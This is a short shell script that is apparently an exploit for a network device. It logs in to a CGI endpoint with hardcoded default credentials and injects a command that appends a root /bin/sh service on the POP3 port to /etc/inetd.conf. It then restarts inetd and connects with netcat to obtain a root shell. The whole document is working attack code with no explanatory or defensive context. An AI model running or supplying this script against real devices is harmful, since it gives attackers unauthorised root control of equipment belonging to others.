#!/bin/sh

echo "adding a shell ... "
curl -s --data 'CMD=`echo pop3 stream tcp nowait root /usr/sbin/tcpd /bin/sh>>/etc/inetd.conf`' 'http://CRAFTSPERSON:ALC#FGU@192.168.4.254/cgi-bin/slidcommon.cgi' >/dev/null
curl -s --data 'CMD=inetd' 'http://CRAFTSPERSON:ALC#FGU@192.168.4.254/cgi-bin/slidcommon.cgi' >/dev/null
echo "done"

nc 192.168.4.254 110
